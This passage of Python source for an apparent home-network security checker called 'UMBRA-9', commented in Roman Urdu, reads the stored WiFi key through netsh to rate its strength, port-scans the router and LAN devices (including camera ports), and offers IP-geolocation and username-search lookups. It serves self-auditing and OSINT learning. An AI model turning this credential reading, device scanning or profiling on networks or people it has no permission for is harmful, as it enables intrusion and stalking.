                F.append(_f("ok", f"WiFi: {ssid} - WPA3 (sab se mazboot)", f"Encryption: {auth}. Ye nayi aur mehfooz tareen setting hai."))
            elif "WPA2" in a:
                F.append(_f("ok", f"WiFi: {ssid} - WPA2", f"Encryption: {auth}. Theek hai - password mazboot ho to ye kaafi hai."))
            elif "OPEN" in a or "WEP" in a:
                F.append(_f("danger", f"WiFi: {ssid} - KHATARNAK encryption ({auth})", "WEP/Open matlab koi bhi aasani se ghuss sakta hai. Router settings mein WPA2/WPA3 karo."))
            else:
                F.append(_f("warn", f"WiFi: {ssid}", f"Encryption: {auth or 'maloom nahi'}"))
            prof = _run(f'netsh wlan show profile name="{ssid}" key=clear', 20)
            km = re.search(r"Key Content\s*:\s*(.+)", prof)
            if km:
                pw = km.group(1).strip()
                reasons = _password_weaknesses(pw)
                if reasons:
                    F.append(_f("danger", "Tumhara apna WiFi password KAMZOR hai",
                                "Wajah: " + "; ".join(reasons) + ". Aisa password unhi tools se nikal sakta hai jin ki guides UMBRA-9 mein hain. Foran lamba aur ajeeb password rakho (3-4 alfaaz + number + nishan)."))
                else:
                    F.append(_f("ok", "Tumhara WiFi password mazboot laga",
                                f"Length {len(pw)} hai aur aam lists mein nahi mila. (Password yahan dikhaya nahi gaya - hifazat ki wajah se.)"))
        else:
            F.append(_f("warn", "WiFi ki info nahi mili", "Ho sakta hai is waqt WiFi se connected nahi ho (cable laga hai ya VM hai)."))
    else:
        rt = _run("ip route", 10)
        m = re.search(r"default via ([\d.]+)", rt)
        gateway = m.group(1) if m else None
        m = re.search(r"src ([\d.]+)", rt)
        myip = m.group(1) if m else None
        F.append(_f("warn", "WiFi wali checks is machine par mehdoood hain",
                    "Linux/VM par WiFi aksar host (Windows) ka hota hai - WiFi password test Windows par milega. Neeche router aur network ki checks hain."))
    # Router / gateway ports
    if gateway:
        names = {21: "FTP", 23: "Telnet", 80: "HTTP admin", 443: "HTTPS admin", 8080: "Alt admin", 8443: "Alt HTTPS"}
        openp = [p for p in names if _port_open(gateway, p, 0.6)]
        det, lvl = [], "ok"
        if 23 in openp:
            lvl = "danger"
            det.append("Telnet (23) KHULA hai - ye bohat purana aur ghair-mehfooz tareeqa hai, router settings se band karo")
        if 80 in openp and 443 not in openp:
            if lvl == "ok":
                lvl = "warn"
            det.append("Admin panel sirf HTTP (80) par hai, HTTPS nahi - apne network ke andar theek hai, lekin router ka admin password lazmi mazboot rakho aur default (admin/admin) kabhi na rakho")
        if not det:
            det.append("Koi khatarnak port nahi mila. Khule ports: " + (", ".join(f"{p} ({names[p]})" for p in openp) if openp else "koi nahi"))
        F.append(_f(lvl, f"Router/Gateway ({gateway}) ke ports", "; ".join(det)))
    else:
        F.append(_f("warn", "Router ka address (gateway) nahi mila", "Network se theek se connection nahi lag raha."))
    # Network par devices (ARP)
    arp = _run("arp -a", 15)
    devs = []
    for ip, mac in re.findall(r"(\d+\.\d+\.\d+\.\d+)\s+([0-9a-fA-F]{2}(?:[:-][0-9a-fA-F]{2}){5})", arp):
        if ip.endswith(".255") or ip.startswith(("224.", "239.", "255.")):
            continue
        if gateway and ip == gateway:
            continue
        if myip and ip == myip:
            continue
        devs.append((ip, mac))
    if devs:
        F.append(_f("ok", f"Tumhare network par {len(devs)} aur devices nazar ayi",
                    "Inhein pehchano - jo device tumhari na ho, wo sawal hai ke kaun tumhara WiFi istemal kar raha hai: " +
                    "; ".join(f"{ip} ({mac})" for ip, mac in devs[:12])))
    else:
        F.append(_f("ok", "Network par doosri devices nazar nahi ayi", "Ya is waqt akelay ho, ya devices ne haal mein koi baat nahi ki (ARP list purani bhi ho sakti hai)."))
    # Camera-type ports wali devices
    targets = [ip for ip, _ in devs[:20]]
    if targets:
        cam_ports = [554, 8000, 8080, 34567]
        hits = {}
        with ThreadPoolExecutor(max_workers=40) as ex:
            fut_map = {ex.submit(_port_open, ip, p, 0.4): (ip, p) for ip in targets for p in cam_ports}
            for fut, (ip, p) in fut_map.items():
                try:
                    if fut.result():
                        hits.setdefault(ip, []).append(p)
                except Exception:
                    pass
        if hits:
            F.append(_f("warn", "Camera-type ports wali devices mili",
                        "Ye ports (khaas 554/RTSP) aksar CCTV/IP cameras par khule hote hain. Agar ye tumhari apni cameras hain to un ka password mazboot rakho - default (admin/admin) kabhi na rakho. " +
                        "; ".join(f"{ip} (ports: {', '.join(str(x) for x in ps)})" for ip, ps in list(hits.items())[:6])))
    if dns:
        F.append(_f("ok", "DNS servers", ", ".join(dns[:3]) + " - ye wo diary hai jahan se tumhari device har website ka rasta poochti hai."))
    counts = {"ok": 0, "warn": 0, "danger": 0}
    for f in F:
        counts[f["level"]] = counts.get(f["level"], 0) + 1
    lines = [f"APNA NETWORK TEST - {osname}"]
    for f in F:
        lines.append(f"[{f['level'].upper()}] {f['title']} :: {f['detail']}")
    return {"os": osname, "findings": F, "counts": counts, "text": "\n".join(lines)}


def _api_nettest(self, data):
    self._send_json(network_test())


Handler._api_nettest = _api_nettest


# ---------------------------------------------------------------------------
# IP LOCATION LOOKUP (OSINT) - IP se sheher/ilaqa + ISP.
# Haqiqat: IP se sirf sheher ki had tak pata chalta hai - kisi ke ghar ka
# address ya live location is se NAHI milti, aur kisi shakhs ko baghair
# ijazat trace karna jurm hai. Ye OSINT seekhne + apni pehchan dekhne ke
# liye hai.
# ---------------------------------------------------------------------------
def _api_iplookup(self, data):
    ip = str(data.get("ip", "")).strip()
    if ip and not re.fullmatch(r"\d{1,3}(\.\d{1,3}){3}", ip):
        self._send_json({"error": "IP theek se likho (masalan 8.8.8.8) - ya khali chhor kar apni IP dekho."}, 400)
        return
    try:
        url = ("http://ip-api.com/json/" + ip +
               "?fields=status,message,query,country,regionName,city,isp,org,as,lat,lon,timezone")
        req = urllib.request.Request(url, headers={"User-Agent": "UMBRA-9"})
        with urllib.request.urlopen(req, timeout=10) as resp:
            d = json.loads(resp.read().decode("utf-8"))
    except Exception:
        self._send_json({"error": "Internet se jawab nahi aya - ye lookup internet mangta hai. Connection check karke dobara try karo."})
        return
    if d.get("status") != "success":
        self._send_json({"error": "Is IP ki info nahi mili (" + str(d.get("message", "?")) +
                                  "). Private/local IP (192.168... wali) ki koi public location nahi hoti."})
        return
    self._send_json({"result": d})


Handler._api_iplookup = _api_iplookup


# ---------------------------------------------------------------------------
# USERNAME SEARCH (OSINT) - ek username kin kin jagah PUBLIC mojood hai.
# Sirf wahi profiles jo banda khud sab ke liye khula rakhta hai. Private
# account ke andar kuch nahi milta, password/location bilkul nahi. Kuch
# sites (Instagram/Facebook/X) robots ko saaf jawab nahi deti - un par
# "khud check karo" aata hai. (Famous OSINT tool "Sherlock" yahi kaam
# karta hai.)
# ---------------------------------------------------------------------------
USERNAME_SITES = [
    ("GitHub", "https://github.com/{u}", "api"),
    ("YouTube", "https://www.youtube.com/@{u}", "web"),
    ("TikTok", "https://www.tiktok.com/@{u}", "web"),
    ("Twitch", "https://www.twitch.tv/{u}", "check"),
    ("Reddit", "https://www.reddit.com/user/{u}", "web"),
    ("Telegram", "https://t.me/{u}", "web"),
    ("Snapchat", "https://www.snapchat.com/add/{u}", "web"),
    ("Steam", "https://steamcommunity.com/id/{u}", "web"),
    ("Instagram", "https://www.instagram.com/{u}", "check"),
    ("Facebook", "https://www.facebook.com/{u}", "check"),
    ("X (Twitter)", "https://x.com/{u}", "check"),
]


def _check_username(url, kind, u):
    if kind == "check":
        return "check", None
    target = f"https://api.github.com/users/{u}" if kind == "api" else url
    for _attempt in range(2):
        try:
            req = urllib.request.Request(target, headers={"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) UMBRA-9"})
            with urllib.request.urlopen(req, timeout=8) as resp:
                if resp.status != 200:
                    return "check", None
                if kind == "api":
                    try:
                        return "found", json.loads(resp.read().decode("utf-8"))
                    except Exception:
                        return "found", None
                return "found", None
        except urllib.error.HTTPError as e:
            if e.code == 404:
                return "notfound", None
        except Exception:
            pass
    return "check", None


def _api_username(self, data):
    u = str(data.get("username", "")).strip().lstrip("@")
    if not re.fullmatch(r"[A-Za-z0-9._-]{2,40}", u):
        self._send_json({"error": "Username theek se likho (2-40 characters; sirf letters, numbers, . _ -)."}, 400)
        return
    results = []
    with ThreadPoolExecutor(max_workers=11) as ex:
        futs = {}
        for site, tmpl, kind in USERNAME_SITES:
            url = tmpl.format(u=u)
            futs[ex.submit(_check_username, url, kind, u)] = (site, url)
        for fut, (site, url) in futs.items():
            try:
                st, extra = fut.result()
            except Exception:
                st, extra = "check", None
            entry = {"site": site, "url": url, "status": st}
            if site == "GitHub" and st == "found" and extra:
                det = {}
                for key, label in (("name", "Naam"), ("location", "Location (profile mein khud likhi hui)"),
                                   ("company", "Company"), ("bio", "Bio"),
                                   ("public_repos", "Public repos"), ("followers", "Followers"),
                                   ("created_at", "Account kab bana")):
                    v = extra.get(key)
                    if v not in (None, ""):
                        det[label] = str(v)[:160]
                if det:
                    entry["details"] = det
            results.append(entry)
    order = {"found": 0, "check": 1, "notfound": 2}
    results.sort(key=lambda r: order.get(r["status"], 9))
    self._send_json({"username": u, "results": results})


Handler._api_username = _api_username


if __name__ == "__main__":
    main()
